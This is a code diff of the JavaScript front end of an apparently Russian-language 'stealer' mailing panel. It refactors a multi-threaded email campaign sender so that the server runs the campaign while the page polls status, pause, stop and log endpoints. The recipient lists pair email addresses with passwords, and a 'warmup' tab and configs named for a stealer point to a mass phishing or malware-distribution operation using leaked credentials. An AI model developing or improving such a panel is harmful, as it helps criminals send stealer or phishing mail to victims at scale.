@@ -17,6 +17,27 @@
     });
   }
 
+  function readJsonSafeResponse(r) {
+    return r.text().then(function (raw) {
+      var text = String(raw || '');
+      var data = null;
+      if (text) {
+        try { data = JSON.parse(text); } catch (e) { data = null; }
+      }
+      if (!r.ok) {
+        if (data && data.error) throw new Error(String(data.error));
+        var hint = text.replace(/\s+/g, ' ').trim().slice(0, 120);
+        throw new Error('HTTP ' + r.status + (hint ? ' · ' + hint : ''));
+      }
+      if (!data) {
+        var t = text.replace(/\s+/g, ' ').trim().slice(0, 120);
+        throw new Error('Сервер вернул не-JSON ответ' + (t ? ' · ' + t : ''));
+      }
+      if (data && data.ok === false) throw new Error(String(data.error || 'Ошибка'));
+      return data;
+    });
+  }
+
   var stealerEmailCurrentId = null;
   var STEALER_NEW_CONFIG_ID = '__new__';
   var stealerEmailConfigList = [];
@@ -237,7 +258,6 @@
       if (msgEl) { msgEl.textContent = 'Сохранено'; msgEl.className = 'config-msg success'; msgEl.classList.remove('hidden'); }
       setTimeout(function () { if (msgEl) msgEl.classList.add('hidden'); }, 2000);
       if (!noReload) appendLog('Конфиг сохранён.', 'success');
-      try { localStorage.removeItem(MAILER_PROGRESS_KEY); } catch (e) {}
       if (!noReload) loadConfigStealerEmail();
       if (isSaveAs) {
         var saveAsRow = document.querySelector('.config-email-save-as-name');
@@ -497,22 +517,76 @@
 
   var campaignState = 'idle';
   var campaignLeads = [];
-  var campaignConfigList = [];
-  var campaignIndex = 0;
   var campaignSentCount = 0;
-  var campaignStopped = false;
-  var campaignActiveWorkers = 0;
-  var campaignListHash = '';
-
-  function listHashForProgress(rawList) {
-    var s = (rawList || '').trim();
-    return s.length + ':' + (s.slice(0, 120) + '|' + s.slice(Math.max(0, s.length - 120)));
-  }
+  var campaignFailedCount = 0;
+  var campaignTotal = 0;
+  var campaignLastLogHash = '';
+  var campaignPollTimer = null;
 
   var MAILER_LOG_KEY = 'mailer-campaign-log';
-  var MAILER_PROGRESS_KEY = 'mailer-campaign-progress';
   var MAILER_LOG_MAX = 500;
   var campaignLogEntries = [];
+
+  function stopCampaignPoll() {
+    if (campaignPollTimer) {
+      clearTimeout(campaignPollTimer);
+      campaignPollTimer = null;
+    }
+  }
+
+  function logHash(items) {
+    var s = '';
+    for (var i = 0; i < items.length; i++) {
+      var row = items[i] || {};
+      s += String(row.text || '') + '|' + String(row.type || '') + '\n';
+    }
+    return String(items.length) + ':' + String(s.length);
+  }
+
+  function renderCampaignLogFromServer(items) {
+    var list = Array.isArray(items) ? items.slice(-MAILER_LOG_MAX) : [];
+    var hash = logHash(list);
+    if (hash === campaignLastLogHash) return;
+    campaignLastLogHash = hash;
+    campaignLogEntries = list.map(function (x) {
+      return { text: String((x && x.text) || ''), type: String((x && x.type) || '') };
+    });
+    var logEl = document.getElementById('mailer-log');
+    if (!logEl) return;
+    logEl.innerHTML = '';
+    for (var i = 0; i < campaignLogEntries.length; i++) {
+      var line = document.createElement('div');
+      line.className = 'mailer-log-line' + (campaignLogEntries[i].type ? ' ' + campaignLogEntries[i].type : '');
+      line.textContent = campaignLogEntries[i].text;
+      logEl.appendChild(line);
+    }
+    logEl.scrollTop = logEl.scrollHeight;
+    try { localStorage.setItem(MAILER_LOG_KEY, JSON.stringify(campaignLogEntries)); } catch (e) {}
+  }
+
+  function applyCampaignStatus(data) {
+    var running = !!(data && data.running);
+    var paused = !!(data && data.paused);
+    campaignState = running ? (paused ? 'paused' : 'running') : 'idle';
+    campaignSentCount = (data && typeof data.sent === 'number') ? data.sent : 0;
+    campaignFailedCount = (data && typeof data.failed === 'number') ? data.failed : 0;
+    campaignTotal = (data && typeof data.total === 'number') ? data.total : (campaignLeads.length || 0);
+    campaignLeads = campaignTotal > 0 ? Array(campaignTotal).fill(null) : [];
+    updateLogProgress(campaignSentCount, campaignTotal);
+    updateCampaignUI();
+    renderCampaignLogFromServer(data && data.log ? data.log : []);
+  }
+
+  function pollCampaignStatus() {
+    authFetch('/api/mailer-campaign/status').then(readJsonSafeResponse).then(function (data) {
+      applyCampaignStatus(data || {});
+      stopCampaignPoll();
+      campaignPollTimer = setTimeout(pollCampaignStatus, (data && data.running) ? 1500 : 2500);
+    }).catch(function () {
+      stopCampaignPoll();
+      campaignPollTimer = setTimeout(pollCampaignStatus, 3000);
+    });
+  }
 
   function updateCampaignUI() {
     var startBtn = document.getElementById('campaign-start-btn');
@@ -537,191 +611,83 @@
     }
     if (statusEl) {
       var sent = campaignSentCount;
-      var total = campaignLeads.length;
+      var total = campaignTotal || campaignLeads.length;
       if (campaignState === 'idle') {
         statusEl.textContent = total ? 'Отправлено ' + sent + ' из ' + total : '';
       } else if (campaignState === 'running') {
-        statusEl.textContent = 'Рассылка… ' + sent + ' / ' + total;
+        statusEl.textContent = 'Рассылка… ' + sent + ' / ' + total + (campaignFailedCount > 0 ? (' · ошибок: ' + campaignFailedCount) : '');
       } else {
-        statusEl.textContent = 'Пауза. ' + sent + ' / ' + total;
+        statusEl.textContent = 'Пауза. ' + sent + ' / ' + total + (campaignFailedCount > 0 ? (' · ошибок: ' + campaignFailedCount) : '');
       }
     }
-  }
-
-  function getCampaignDelayMs() {
-    var delayEl = document.getElementById('campaign-delay-sec');
-    var delaySec = (delayEl && delayEl.value) ? parseFloat(delayEl.value, 10) : 1.5;
-    if (isNaN(delaySec) || delaySec < 0.5) delaySec = 1.5;
-    if (delaySec > 60) delaySec = 60;
-    return Math.round(delaySec * 1000);
-  }
-
-  function runCampaignWorker() {
-    var delayMs = getCampaignDelayMs();
-    if (campaignState === 'paused') {
-      setTimeout(function () { runCampaignWorker(); }, 400);
-      return;
-    }
-    if (campaignStopped || campaignIndex >= campaignLeads.length) {
-      campaignActiveWorkers--;
-      if (campaignActiveWorkers <= 0) {
-        campaignState = 'idle';
-        campaignStopped = false;
-        updateCampaignUI();
-        if (campaignSentCount > 0 && campaignSentCount >= campaignLeads.length) {
-          appendLog('Рассылка завершена. Отправлено ' + campaignSentCount + ' из ' + campaignLeads.length + '.', 'success');
-        }
-      }
-      return;
-    }
-    var idx = campaignIndex++;
-    if (idx >= campaignLeads.length) {
-      campaignActiveWorkers--;
-      if (campaignActiveWorkers <= 0) {
-        campaignState = 'idle';
-        campaignStopped = false;
-        updateCampaignUI();
-        if (campaignSentCount >= campaignLeads.length) {
-          appendLog('Рассылка завершена. Отправлено ' + campaignSentCount + ' из ' + campaignLeads.length + '.', 'success');
-        }
-      }
-      return;
-    }
-    var lead = campaignLeads[idx];
-    var leadId = (lead && lead.id) ? lead.id : '';
-    var toEmail = (lead && lead.email) ? String(lead.email).trim() : '';
-    var configId = stealerEmailCurrentId || null;
-    var fromName = (campaignConfigList && campaignConfigList[0]) ? (campaignConfigList[0].name || '') : '';
-    var isFromBase = leadId.indexOf('base-') === 0;
-    var sendPayload = isFromBase
-      ? { toEmail: toEmail, password: (lead && lead.password) ? String(lead.password) : '', configId: configId || undefined }
-      : { id: leadId, configId: configId || undefined };
-    if (!toEmail) {
-      campaignSentCount++;
-      updateLogProgress(campaignSentCount, campaignLeads.length);
-      updateCampaignUI();
-      setTimeout(function () { runCampaignWorker(); }, delayMs);
-      return;
-    }
-    postJson('/api/send-stealer', sendPayload).then(function (r) {
-      return r.json().then(function (data) {
-        if (!r.ok) throw new Error((data && data.error) || r.statusText || 'Ошибка отправки');
-        if (data && data.ok === false) throw new Error((data && data.error) || 'Ошибка отправки');
-        return data;
-      });
-    }).then(function (data) {
-      campaignSentCount++;
-      var fromDisplay = (data && data.fromEmail) ? data.fromEmail : (fromName || '…');
-      var num = idx + 1;
-      var total = campaignLeads.length;
-      appendLog('Отправлено ' + num + '/' + total + ': с ' + fromDisplay + ' на ' + toEmail, 'success');
-      updateLogProgress(campaignSentCount, campaignLeads.length);
-      updateCampaignUI();
-      setTimeout(function () { runCampaignWorker(); }, getCampaignDelayMs());
-    }).catch(function (err) {
-      appendLog('Ошибка отправки на ' + toEmail + ': ' + (err.message || err), 'error');
-      updateLogProgress(campaignSentCount, campaignLeads.length);
-      updateCampaignUI();
-      setTimeout(function () { runCampaignWorker(); }, getCampaignDelayMs());
-    });
   }
 
   document.getElementById('campaign-start-btn').addEventListener('click', function () {
     if (campaignState === 'running') return;
-    if (campaignState === 'idle' && stealerEmailCurrentId === STEALER_NEW_CONFIG_ID) {
+    if (stealerEmailCurrentId === STEALER_NEW_CONFIG_ID) {
       var msgEl = document.getElementById('config-email-message');
       if (msgEl) { msgEl.textContent = 'Сначала сохраните конфиг или выберите существующий.'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
       return;
     }
-    if (campaignState === 'idle') {
-      campaignStopped = false;
-      campaignActiveWorkers = 0;
-      var recipientsInput = document.getElementById('config-email-recipients-list');
-      var rawList = (recipientsInput && recipientsInput.value) ? recipientsInput.value : '';
-      var parseResult = parseRecipientsList(rawList);
-      var fromBase = parseResult.items;
-      if (fromBase.length > 0) {
-        if (parseResult.invalidCount > 0) appendLog('Пропущено невалидных email: ' + parseResult.invalidCount, 'muted');
-        campaignLeads = fromBase.map(function (r, i) { return { id: 'base-' + i, email: r.email, password: r.password || '' }; });
-        campaignListHash = listHashForProgress(rawList);
-        campaignConfigList = stealerEmailConfigList.length ? stealerEmailConfigList.slice() : [{ id: stealerEmailCurrentId, name: 'Config' }];
-        var saved = (function () {
-          try {
-            var p = localStorage.getItem(MAILER_PROGRESS_KEY);
-            if (!p) return null;
-            var q = JSON.parse(p);
-            if (q && q.total === campaignLeads.length && typeof q.sent === 'number' && q.sent > 0 && q.sent < q.total && q.listHash === campaignListHash) return q.sent;
-          } catch (e) {}
-          return null;
-        })();
-        campaignIndex = saved != null ? saved : 0;
-        campaignSentCount = saved != null ? saved : 0;
-        campaignState = 'running';
-        updateCampaignUI();
-        var threadsEl = document.getElementById('campaign-threads');
-        var delayEl = document.getElementById('campaign-delay-sec');
-        var numThreads = (threadsEl && threadsEl.value) ? parseInt(threadsEl.value, 10) : 1;
-        var delaySec = (delayEl && delayEl.value) ? parseFloat(delayEl.value, 10) : 1.5;
-        if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
-        if (numThreads > 20) numThreads = 20;
-        if (isNaN(delaySec) || delaySec < 0.5) delaySec = 1.5;
-        if (delaySec > 60) delaySec = 60;
-        campaignActiveWorkers = numThreads;
-        appendLog(saved != null ? 'Продолжение рассылки (база email). Отправлено ' + campaignSentCount + ' из ' + campaignLeads.length + '.' : ('Рассылка запущена (база email). Всего: ' + campaignLeads.length + ' писем. Потоков: ' + numThreads + ', задержка: ' + delaySec + ' сек.'), 'muted');
-        if (numThreads > 1) appendLog('Порядок записей в логе — по завершению отправки, а не по порядку в списке. Номер в формате N/Total — позиция в вашей базе.', 'muted');
-        updateLogProgress(campaignSentCount, campaignLeads.length);
-        for (var w = 0; w < numThreads; w++) runCampaignWorker();
-        return;
-      }
+    var recipientsInput = document.getElementById('config-email-recipients-list');
+    var rawList = (recipientsInput && recipientsInput.value) ? recipientsInput.value : '';
+    var parseResult = parseRecipientsList(rawList);
+    var fromBase = parseResult.items;
+    if (!fromBase.length) {
       var msgEl = document.getElementById('config-email-message');
       if (msgEl) { msgEl.textContent = 'Заполните базу email в конфиге (поле «База email») и нажмите Старт.'; msgEl.className = 'config-msg error'; msgEl.classList.remove('hidden'); }
       return;
-    } else {
-      // Продолжить после паузы: перечитываем базу из формы; если список изменился — начинаем с новой базы
-      var recipientsInput = document.getElementById('config-email-recipients-list');
-      var rawListResume = (recipientsInput && recipientsInput.value) ? recipientsInput.value : '';
-      var newHash = listHashForProgress(rawListResume);
-      if (newHash !== campaignListHash) {
-        var parseResume = parseRecipientsList(rawListResume);
-        if (parseResume.items.length > 0) {
-          campaignLeads = parseResume.items.map(function (r, i) { return { id: 'base-' + i, email: r.email, password: r.password || '' }; });
-          campaignListHash = newHash;
-          campaignIndex = 0;
-          campaignSentCount = 0;
-          try { localStorage.removeItem(MAILER_PROGRESS_KEY); } catch (e) {}
-          appendLog('База email изменена — рассылка продолжена по новому списку (' + campaignLeads.length + ' писем).', 'muted');
-        }
-      }
-      campaignConfigList = stealerEmailConfigList.length ? stealerEmailConfigList.slice() : [{ id: stealerEmailCurrentId, name: 'Config' }];
-      var threadsEl = document.getElementById('campaign-threads');
-      var numThreads = (threadsEl && threadsEl.value) ? parseInt(threadsEl.value, 10) : 1;
-      if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
-      if (numThreads > 20) numThreads = 20;
-      var extra = Math.max(0, numThreads - campaignActiveWorkers);
-      if (extra > 0) {
-        campaignActiveWorkers += extra;
-        for (var w = 0; w < extra; w++) runCampaignWorker();
-      }
-      campaignState = 'running';
-      appendLog('Продолжение рассылки. Потоков: ' + numThreads + ', задержка из формы. Осталось: ' + Math.max(0, campaignLeads.length - campaignSentCount) + '.', 'muted');
-      updateCampaignUI();
     }
+    if (parseResult.invalidCount > 0) appendLog('Пропущено невалидных email: ' + parseResult.invalidCount, 'muted');
+    var threadsEl = document.getElementById('campaign-threads');
+    var delayEl = document.getElementById('campaign-delay-sec');
+    var numThreads = (threadsEl && threadsEl.value) ? parseInt(threadsEl.value, 10) : 1;
+    var delaySec = (delayEl && delayEl.value) ? parseFloat(delayEl.value, 10) : 1.5;
+    if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
+    if (numThreads > 20) numThreads = 20;
+    if (isNaN(delaySec) || delaySec < 0.5) delaySec = 1.5;
+    if (delaySec > 60) delaySec = 60;
+    postJson('/api/mailer-campaign/start', {
+      configId: stealerEmailCurrentId || undefined,
+      numThreads: numThreads,
+      delaySec: delaySec,
+      recipients: fromBase.map(function (r) { return { email: r.email, password: r.password || '' }; })
+    }).then(readJsonSafeResponse).then(function () {
+      campaignState = 'running';
+      campaignTotal = fromBase.length;
+      campaignLeads = Array(campaignTotal).fill(null);
+      campaignSentCount = 0;
+      campaignFailedCount = 0;
+      campaignLastLogHash = '';
+      updateCampaignUI();
+      updateLogProgress(campaignSentCount, campaignTotal);
+      pollCampaignStatus();
+    }).catch(function (err) {
+      appendLog('Ошибка запуска рассылки: ' + (err.message || err), 'error');
+      updateCampaignUI();
+    });
   });
   document.getElementById('campaign-pause-btn').addEventListener('click', function () {
-    if (campaignState === 'running') {
-      campaignState = 'paused';
-      appendLog('Рассылка на паузе. Отправлено ' + campaignSentCount + ' из ' + campaignLeads.length + '.', 'muted');
-    }
-    updateCampaignUI();
+    var delayEl = document.getElementById('campaign-delay-sec');
+    var threadsEl = document.getElementById('campaign-threads');
+    var delaySec = (delayEl && delayEl.value) ? parseFloat(delayEl.value, 10) : 1.5;
+    var numThreads = (threadsEl && threadsEl.value) ? parseInt(threadsEl.value, 10) : 1;
+    if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
+    if (numThreads > 20) numThreads = 20;
+    if (isNaN(delaySec) || delaySec < 0.5) delaySec = 1.5;
+    if (delaySec > 60) delaySec = 60;
+    postJson('/api/mailer-campaign/pause', { delaySec: delaySec, numThreads: numThreads }).then(readJsonSafeResponse).then(function () {
+      pollCampaignStatus();
+    }).catch(function (err) {
+      appendLog('Ошибка паузы/продолжения: ' + (err.message || err), 'error');
+    });
   });
   document.getElementById('campaign-stop-btn').addEventListener('click', function () {
-    if (campaignState === 'idle') return;
-    campaignStopped = true;
-    campaignState = 'idle';
-    if (campaignLeads.length > 0) {
-      appendLog('Рассылка остановлена. Отправлено ' + campaignSentCount + ' из ' + campaignLeads.length + '.', 'muted');
-    }
-    updateCampaignUI();
+    postJson('/api/mailer-campaign/stop', {}).then(readJsonSafeResponse).then(function () {
+      pollCampaignStatus();
+    }).catch(function (err) {
+      appendLog('Ошибка остановки: ' + (err.message || err), 'error');
+    });
   });
 
   var mailerLogClearBtn = document.getElementById('mailer-log-clear-btn');
@@ -742,10 +708,12 @@
       if (panelCampaign) panelCampaign.classList.toggle('hidden', isWarmup);
       if (panelWarmup) panelWarmup.classList.toggle('hidden', !isWarmup);
       if (isWarmup) {
+        stopCampaignPoll();
         loadConfigWarmupEmail();
         pollWarmupStatus();
       } else {
         stopWarmupPoll();
+        pollCampaignStatus();
       }
     }
     if (tabCampaign) tabCampaign.addEventListener('click', function () { showTab('campaign'); });
@@ -926,46 +894,21 @@
   }
 
   function clearMailerLog() {
-    var el = document.getElementById('mailer-log');
-    if (el) el.innerHTML = '';
-    campaignLogEntries = [];
-    try { localStorage.removeItem(MAILER_LOG_KEY); } catch (e) {}
-    appendLog('Лог очищен.', 'muted');
+    postJson('/api/mailer-campaign/log-clear', {}).then(readJsonSafeResponse).then(function () {
+      campaignLastLogHash = '';
+      campaignLogEntries = [];
+      var el = document.getElementById('mailer-log');
+      if (el) el.innerHTML = '';
+      try { localStorage.removeItem(MAILER_LOG_KEY); } catch (e) {}
+      appendLog('Лог очищен.', 'muted');
+      pollCampaignStatus();
+    }).catch(function (err) {
+      appendLog('Ошибка очистки лога: ' + (err.message || err), 'error');
+    });
   }
 
   function restoreMailerState() {
-    var logEl = document.getElementById('mailer-log');
-    if (logEl) {
-      try {
-        var savedLog = localStorage.getItem(MAILER_LOG_KEY);
-        if (savedLog) {
-          var arr = JSON.parse(savedLog);
-          if (Array.isArray(arr) && arr.length) {
-            campaignLogEntries = arr;
-            logEl.innerHTML = '';
-            for (var i = 0; i < arr.length; i++) {
-              var line = document.createElement('div');
-              line.className = 'mailer-log-line' + (arr[i].type ? ' ' + arr[i].type : '');
-              line.textContent = arr[i].text;
-              logEl.appendChild(line);
-            }
-            logEl.scrollTop = logEl.scrollHeight;
-          }
-        }
-      } catch (e) {}
-    }
-    try {
-      var savedProgress = localStorage.getItem(MAILER_PROGRESS_KEY);
-      if (savedProgress) {
-        var p = JSON.parse(savedProgress);
-        if (p && typeof p.sent === 'number' && typeof p.total === 'number' && p.total > 0) {
-          campaignSentCount = Math.min(p.sent, p.total);
-          campaignLeads = Array(p.total).fill(null);
-          updateLogProgress(campaignSentCount, p.total);
-          updateCampaignUI();
-        }
-      }
-    } catch (e) {}
+    pollCampaignStatus();
   }
 
   function updateLogProgress(sent, total) {
@@ -975,9 +918,6 @@
     var etaEl = document.getElementById('mailer-log-eta');
     var pct = total > 0 ? Math.round((sent / total) * 100) : 0;
     var remaining = Math.max(0, total - sent);
-    if (total > 0) {
-      try { localStorage.setItem(MAILER_PROGRESS_KEY, JSON.stringify({ sent: sent, total: total, listHash: campaignListHash })); } catch (e) {}
-    }
     if (fill) fill.style.width = pct + '%';
     if (text) text.textContent = pct + '%';
     if (stats) stats.textContent = 'Отправлено: ' + sent + ' · Осталось: ' + remaining;
@@ -1261,7 +1201,6 @@
       if (isWarmup) {
         saveConfigWarmupEmail();
       } else {
-        try { localStorage.removeItem(MAILER_PROGRESS_KEY); } catch (e) {}
         saveConfigStealerEmail(false);
       }
     } else if (currentEditMode === 'html') {
